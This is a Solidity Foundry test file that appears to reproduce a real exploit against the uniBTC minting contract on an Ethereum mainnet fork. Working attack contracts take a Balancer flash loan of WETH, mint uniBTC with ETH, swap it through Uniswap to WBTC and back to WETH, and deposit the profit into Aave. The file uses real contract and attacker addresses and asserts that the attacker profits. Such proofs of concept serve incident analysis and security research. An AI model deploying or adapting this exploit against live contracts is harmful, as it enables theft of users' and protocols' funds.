
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant TX_TIMESTAMP = 1727375303;
    uint256 constant TX_BLOCK_NUMBER = 20836584;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.warp(TX_TIMESTAMP);
        vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), Addresses.attack_child);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();

        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttackRuntimes();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        attack.bindAttackChild(Addresses.attack_child);
    }

    function _etchAttackRuntimes() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        _expectProfit(Addresses.attack_child, attackChild, Addresses.uniBTC, "uniBTC", 198579569);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function attack() external payable {
        _startFlashLoan();
    }

    function executeSetup() external payable {
        _startFlashLoan();
    }

    function deployAttackChildContracts() external returns (address) {
        attackChild = AttackChild(payable(Addresses.attack_child));
        return address(attackChild);
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function _startFlashLoan() internal {
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        (bool ok,) = address(attackChild)
            .call(
                abi.encodeWithSelector(
                    bytes4(0xbad3c794),
                    Addresses.SwapRouter,
                    Addresses.BalancerVault,
                    Addresses.AaveWethGateway,
                    Addresses.uniBtcMinter,
                    Addresses.WETH,
                    Addresses.WBTC,
                    Addresses.uniBTC,
                    Addresses.profitReceiver,
                    uint256(30_800_000_000_000_000_000)
                )
            );
        require(ok, "attack child setup failed");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract AttackChild {
    bool private flashHandled;

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0xbad3c794) {
            startBalancerLoan();
        }
    }

    function startBalancerLoan() public {
        _approveSwapRouter();
        _borrowFromBalancer();
        _settleAaveDeposit();
    }

    function receiveFlashLoan(
        address[] calldata borrowedTokens,
        uint256[] calldata borrowedAmounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        borrowedTokens;
        borrowedAmounts;
        feeAmounts;
        userData;

        if (!flashHandled) {
            flashHandled = true;
            flashCallback();
            flashCallback2();
            flashCallback3();
        }
    }

    function flashCallback() internal {
        uint256 borrowedWeth = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(borrowedWeth);
        IUniBtcMinter(Addresses.uniBtcMinter).mint{value: 30_800_000_000_000_000_000}();
        IERC20Like(Addresses.uniBTC).balanceOf(address(this));
    }

    function flashCallback2() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: Addresses.uniBTC,
                    tokenOut: Addresses.WBTC,
                    fee: 500,
                    recipient: address(this),
                    deadline: 1_727_375_303,
                    amountIn: 3_080_000_000,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        IERC20Like(Addresses.WBTC).balanceOf(address(this));
    }

    function flashCallback3() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: Addresses.WBTC,
                    tokenOut: Addresses.WETH,
                    fee: 500,
                    recipient: address(this),
                    deadline: 1_727_375_303,
                    amountIn: 2_783_925_883,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        IERC20Like(Addresses.WETH).transfer(Addresses.BalancerVault, 30_800_000_000_000_000_000);
    }

    function repayBalancerVault() external {
        _repayBalancer(Addresses.WETH, 30_800_000_000_000_000_000);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancer(tokens[i], amounts[i]);
        }
    }

    function _approveSwapRouter() internal {


        IERC20Like(Addresses.uniBTC).approve(Addresses.SwapRouter, type(uint256).max);
        IERC20Like(Addresses.WBTC).approve(Addresses.SwapRouter, type(uint256).max);
    }

    function _borrowFromBalancer() internal {
        IBalancerVault(Addresses.BalancerVault)
            .flashLoan(address(this), _oneAddress(Addresses.WETH), _oneUint(30_800_000_000_000_000_000), hex"");
    }

    function _settleAaveDeposit() internal {
        uint256 postLoanWeth = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(postLoanWeth);
        IAaveGateway(Addresses.AaveWethGateway).depositETH{value: 649_604_054_576_756_594_919}(
            Addresses.AavePool, Addresses.profitReceiver, uint16(0)
        );
    }

    function _repayBalancer(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.BalancerVault, amount);
    }

    function _oneAddress(address token) internal pure returns (address[] memory tokens) {
        tokens = new address[](1);
        tokens[0] = token;
    }

    function _oneUint(uint256 amount) internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](1);
        amounts[0] = amount;
    }
}

library Addresses {
    address internal constant uniBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
    address internal constant uniBtcMinter = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;
    address internal constant attack_contract = 0x0C8da4f8B823bEe4D5dAb73367D45B5135B50faB;
    address internal constant attack_child = 0x1E1d02D663228e5D47f1De64030B39632A3B787D;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant attacker_eoa = 0x2bFB373017349820dda2Da8230E6b66739BE9F96;
    address internal constant AavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant AaveWethGateway = 0x893411580e590D62dDBca8a703d61Cc4A8c7b2b9;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant profitReceiver = 0xEE800b1b63893Ca1E1b0FA8fEfDc10fAc9B980f7;
}

struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

interface IAaveGateway {
    function depositETH(address pool, address onBehalfOf, uint16 referralCode) external payable;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface ISwapRouter {
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
}

interface IUniBtcMinter {
    function mint() external payable;
    function mint(address to) external returns (uint256 liquidity);
}

interface IWETH {
    function withdraw(uint256) external;
}
